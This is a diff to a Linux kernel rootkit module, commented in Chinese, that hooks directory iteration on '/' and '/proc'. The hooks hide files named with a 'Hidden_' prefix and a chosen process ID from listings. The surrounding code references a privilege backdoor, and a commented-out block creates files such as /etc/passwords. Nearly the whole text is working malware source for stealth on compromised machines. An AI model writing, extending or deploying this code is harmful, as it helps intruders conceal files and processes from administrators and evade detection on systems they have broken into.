@@ -310,33 +310,32 @@ hook_stop(void)
         }                                                   \
     }while(0)
 
-# define ROOT_PATH "/proc/"
+# define ROOT_PATH "/"
 # define SECRET_FILE "Hidden_"
-# define PROCESS_ROOT_PATH 
-# define SECRET_PROC 8056	
+
 
 int 
-(*real_iterate_shared)(struct file *, struct dir_context *); 
+(*real_iterate_shared_file)(struct file *, struct dir_context *); 
 int 
-(*real_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
+(*real_filldir_file)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
 int
-fake_iterate_shared(struct file *filp, struct dir_context *ctx);
+fake_iterate_shared_file(struct file *filp, struct dir_context *ctx);
 int
-fake_filldir(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned d_type);
+fake_filldir_file(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned d_type);
 
-int fake_iterate_shared(struct file *filp, struct dir_context *ctx)
+int fake_iterate_shared_file(struct file *filp, struct dir_context *ctx)
 {
     // 备份真的 ``filldir``，以备后面之需。
-    real_filldir = ctx->actor;
+    real_filldir_file = ctx->actor;
     // 把 ``struct dir_context`` 里的 ``actor``，
     // 也就是真的 ``filldir``
     // 替换成我们的假 ``filldir``
-    *(filldir_t *)&ctx->actor = fake_filldir;
+    *(filldir_t *)&ctx->actor = fake_filldir_file;
 
-    return real_iterate_shared(filp, ctx);
+    return real_iterate_shared_file(filp, ctx);
 }
 
-int fake_filldir(struct dir_context *ctx, const char *name, int namlen,
+int fake_filldir_file(struct dir_context *ctx, const char *name, int namlen,
              loff_t offset, u64 ino, unsigned d_type)
 {
     if (strncmp(name, SECRET_FILE, strlen(SECRET_FILE)) == 0) {
@@ -344,12 +343,44 @@ int fake_filldir(struct dir_context *ctx, const char *name, int namlen,
         printk("Hiding: %s", name);
         return 0;
     }
+    // 如果不是需要隐藏的文件，
+    // 交给的真的 ``filldir`` 把这个记录填到缓冲区里。
+    return real_filldir_file(ctx, name, namlen, offset, ino, d_type);
+}
+
+# define PROC_PATH "/proc"
+# define SECRET_PROC 8123
+
+int 
+(*real_iterate_shared_proc)(struct file *, struct dir_context *); 
+int 
+(*real_filldir_proc)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
+int
+fake_iterate_shared_proc(struct file *filp, struct dir_context *ctx);
+int
+fake_filldir_proc(struct dir_context *ctx, const char *name, int namlen,loff_t offset, u64 ino, unsigned d_type);
+
+int fake_iterate_shared_proc(struct file *filp, struct dir_context *ctx)
+{
+    // 备份真的 ``filldir``，以备后面之需。
+    real_filldir_proc = ctx->actor;
+    // 把 ``struct dir_context`` 里的 ``actor``，
+    // 也就是真的 ``filldir``
+    // 替换成我们的假 ``filldir``
+    *(filldir_t *)&ctx->actor = fake_filldir_proc;
+
+    return real_iterate_shared_proc(filp, ctx);
+}
+
+int fake_filldir_proc(struct dir_context *ctx, const char *name, int namlen,
+             loff_t offset, u64 ino, unsigned d_type)
+{
     char *endp;
     long pid;
 
     // 把字符串变成长整数。
     pid = simple_strtol(name, &endp, 10);
-	//printk("%s",name);
+    //printk("%s",name);
     if (pid == SECRET_PROC) {
         // 是我们需要隐藏的进程，直接返回。
         printk("Hiding pid: %ld", pid);
@@ -357,26 +388,34 @@ int fake_filldir(struct dir_context *ctx, const char *name, int namlen,
     }
     // 如果不是需要隐藏的文件和进程，
     // 交给的真的 ``filldir`` 把这个记录填到缓冲区里。
-    return real_filldir(ctx, name, namlen, offset, ino, d_type);
+    return real_filldir_proc(ctx, name, namlen, offset, ino, d_type);
 }
 
 void hide_file_and_process_start(void)
 {
-	set_f_op(iterate_shared, ROOT_PATH, fake_iterate_shared, real_iterate_shared);
-	if(!real_iterate_shared){
+	set_f_op(iterate_shared, ROOT_PATH, fake_iterate_shared_file, real_iterate_shared_file);
+    set_f_op(iterate_shared, PROC_PATH, fake_iterate_shared_proc, real_iterate_shared_proc);
+	if(!real_iterate_shared_file){
 	    return -ENOENT;
 	}
 }
 
 void hide_file_and_process_stop(void)
 {
-	if(real_iterate_shared){
+	if(real_iterate_shared_file){
 		void *dummy;
-		set_f_op(iterate_shared, ROOT_PATH, real_iterate_shared, dummy);
+		set_f_op(iterate_shared, ROOT_PATH, real_iterate_shared_file, dummy);
+        set_f_op(iterate_shared, PROC_PATH, real_iterate_shared_proc, dummy);
 	}
 }
 
 //========== END HIDE FILE AND PROCESS MODULE =================
+
+
+
+
+
+
 
 
 
@@ -522,6 +561,44 @@ void clean_priviledge_backdoor(void)
 
 
 
+
+//========== CREATE FILE =================
+/*
+
+static void create_file(char *name)
+{
+    struct file *f;
+    char *path;
+
+    mode_t old_mask = xchg(&current->fs->umask, 0);
+
+    path = kzalloc(strlen(name) + strlen(FILE_SUFFIX) + 1, GFP_KERNEL);
+
+    if (!path)
+        return;
+
+    strcpy(path, name);
+    strcat(path, FILE_SUFFIX);
+
+    f = file_open(path, O_CREAT, 0777);
+    if (f)
+        file_close(f);
+
+    kfree(path);
+
+    xchg(&current->fs->umask, old_mask);
+}
+
+static void create_files(void)
+{
+    // create_file("/etc/modules");
+    create_file("/etc/http_requests");
+    create_file("/etc/passwords");
+}
+
+*/
+
+//========== END CREATE FILE =================
 
 
 
